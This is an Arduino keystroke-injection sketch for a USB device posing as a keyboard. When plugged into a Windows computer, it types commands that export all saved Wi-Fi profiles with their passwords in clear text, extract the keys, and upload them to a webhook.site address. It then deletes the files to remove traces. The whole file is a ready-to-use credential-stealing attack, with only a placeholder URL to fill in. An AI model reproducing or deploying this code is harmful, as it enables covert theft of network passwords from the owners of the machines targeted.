// Make sure to add your webhook url on line 30
#include<Keyboard.h>
#define KEY_DELAY 50 //delay between keystrokes for slow computers


void setup() {
  Keyboard.begin();

  delay(3000);
}

void loop() {
  //Pressing Win+r shortcut
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(KEY_DELAY*5);
  //Inputting cmd command
  Keyboard.println("cmd /k");

  delay(KEY_DELAY*5);//A delay to ensure that cmd window has been started
  //Typing the command
  Keyboard.println("cd %temp%");
  delay(500);
  Keyboard.println("netsh wlan export profile key=clear");
  delay(1000);
  Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS");
  delay(1000);
  Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/webhook-url-here -Method POST -InFile WiFi-PASS");
  delay(3000);
  Keyboard.println("del WiFi* /s /f /q");
  delay(500);
  Keyboard.println("exit");


  
  delay(4000);
}
